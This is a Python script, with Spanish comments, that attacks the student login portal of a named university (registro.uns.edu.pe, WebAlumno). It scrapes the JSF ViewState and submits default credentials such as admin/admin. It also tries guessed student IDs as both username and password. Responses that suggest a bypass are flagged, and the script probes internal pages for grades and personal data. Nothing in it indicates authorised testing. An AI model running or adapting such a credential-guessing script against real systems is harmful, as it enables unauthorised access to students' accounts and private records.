#!/usr/bin/env python3
import requests, urllib3, re
urllib3.disable_warnings()

# WebAlumno uses Jakarta EE with different form fields
# frmLogueo:itUsuario = username
# frmLogueo:itClave = password
# frmLogueo = hidden form identifier
# jakarta.faces.ViewState = JSF view state

s = requests.Session()
s.verify = False
s.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': 'https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml',
})

# Step 1: Get login page to extract ViewState and form fields
print("=== PASO 1: Obtener login page ===")
r = s.get('https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml', timeout=10)

# Extract ViewState
viewstate = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r.text)
if viewstate:
    print(f"ViewState: {viewstate.group(1)[:50]}...")
    vstate = viewstate.group(1)
else:
    print("ViewState no encontrado")
    vstate = ""

# Check for crAcceso function
if 'crAcceso' in r.text:
    idx = r.text.find('crAcceso')
    func_text = r.text[idx:idx+500]
    print(f"\ncrAcceso function preview: {func_text[:300]}")

# Step 2: Try login with CORRECT field names
print("\n=== PASO 2: Probar login con campos correctos ===")

creds = [
    ('fake', 'fake'),
    ('admin', 'admin'),
    ('test', 'test'),
    ('abc', 'xyz'),
]

for user, pwd in creds:
    s2 = requests.Session()
    s2.verify = False
    s2.headers.update({
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml',
    })
    r2 = s2.get('https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml', timeout=5)
    vs = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r2.text)
    
    data = {
        'frmLogueo:itUsuario': user,
        'frmLogueo:itClave': pwd,
        'frmLogueo': 'frmLogueo',
    }
    if vs:
        data['jakarta.faces.ViewState'] = vs.group(1)
    
    r3 = s2.post('https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml',
                   data=data, timeout=5, allow_redirects=True)
    
    print(f"  {user}/{pwd} -> HTTP {r3.status_code}, len={len(r3.text)}")
    
    if 'No records' in r3.text.lower():
        print(f"    [!] ACCESO CONCEDIDO - No records")
    if 'error' in r3.text.lower() and 'login' not in r3.text.lower():
        print(f"    [!] Posible error")
    if len(r3.text) > 17321 and 'logueo' not in r3.text.lower():
        print(f"    [!] Posible bypass - la pagina cambio!")
    if 'bienvenida' in r3.text.lower() or 'inicio' in r3.text.lower() or 'modulo' in r3.text.lower():
        print(f"    [!] ACCESO AL DASHBOARD")

# Step 3: Try login with student IDs
print("\n=== PASO 3: Probar con IDs de estudiantes ===")
for uid in ['2024001', '2023001', '2022001', '2021001']:
    s3 = requests.Session()
    s3.verify = False
    s3.headers.update({
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml',
    })
    r3 = s3.get('https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml', timeout=5)
    vs = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r3.text)
    
    data = {
        'frmLogueo:itUsuario': uid,
        'frmLogueo:itClave': uid,
        'frmLogueo': 'frmLogueo',
    }
    if vs:
        data['jakarta.faces.ViewState'] = vs.group(1)
    
    r4 = s3.post('https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml',
                   data=data, timeout=5, allow_redirects=True)
    
    if len(r4.text) > 17321 and 'logueo' not in r4.text.lower():
        print(f"  {uid}/{uid} -> Posible exito! len={len(r4.text)}")
    else:
        print(f"  {uid}/{uid} -> {r4.status_code}, len={len(r4.text)}")

# Step 4: Check what happens after successful login
print("\n=== PASO 4: Verificar dashboard ===")
# Try to access main page after login
r5 = s.get('https://registro.uns.edu.pe:80/WebAlumno/faces/modulos.xhtml', timeout=5)
print(f"modulos.xhtml: {r5.status_code}, len={len(r5.text)}")

r5b = s.get('https://registro.uns.edu.pe:80/WebAlumno/faces/index.xhtml', timeout=5)
print(f"index.xhtml: {r5b.status_code}, len={len(r5b.text)}")

# Step 5: Check crAcceso function more carefully
print("\n=== PASO 5: Funcion crAcceso ===")
cr_idx = r.text.find('function crAcceso')
if cr_idx > 0:
    cr_end = r.text.find('}', cr_idx) + 1
    print(r.text[cr_idx:cr_end+500])
else:
    # Search for it differently
    cr_patterns = re.findall(r'crAcceso[^}]+}', r.text)
    for cp in cr_patterns[:3]:
        print(f"  {cp[:300]}")

# Step 6: Check all endpoints
print("\n=== PASO 6: Endpoints de WebAlumno ===")
endpoints = [
    'https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml',
    'https://registro.uns.edu.pe:80/WebAlumno/faces/index.xhtml',
    'https://registro.uns.edu.pe:80/WebAlumno/faces/modulos.xhtml',
    'https://registro.uns.edu.pe:80/WebAlumno/faces/inicio.xhtml',
    'https://registro.uns.edu.pe:80/WebAlumno/faces/home.xhtml',
    'https://registro.uns.edu.pe:80/WebAlumno/faces/principal.xhtml',
    'https://registro.uns.edu.pe:80/WebAlumno/faces/mis_datos.xhtml',
    'https://registro.uns.edu.pe:80/WebAlumno/faces/notas.xhtml',
    'https://registro.uns.edu.pe:80/WebAlumno/faces/carrera.xhtml',
    'https://registro.uns.edu.pe:80/WebAlumno/faces/error.xhtml',
]
for ep in endpoints:
    try:
        r6 = s.get(ep, timeout=5)
        text_clean = re.sub(r'<[^>]+>', ' ', r6.text)
        text_clean = re.sub(r'\s+', ' ', text_clean).strip()
        has_login = 'logueo' in text_clean.lower() or 'login' in text_clean.lower() or 'itUsuario' in r6.text
        has_data = any(kw in text_clean.lower() for kw in ['records', 'no records', 'modulo', 'estudiante', 'alumno'])
        print(f"  {ep.split('/')[-1]} -> {r6.status_code}, len={len(r6.text)}, login={has_login}, data={has_data}")
    except:
        pass

print("\n=== RESUMEN ===")
print("WebAlumno usa Jakarta EE (no Java EE)")
print("Campos: frmLogueo:itUsuario, frmLogueo:itClave, jakarta.faces.ViewState")
print("Tiene X-Frame-Options: DENY (anti-clickjacking)")
print("Solo accesible en puerto 80 (no 443)")
print("El crAcceso() maneja el login")
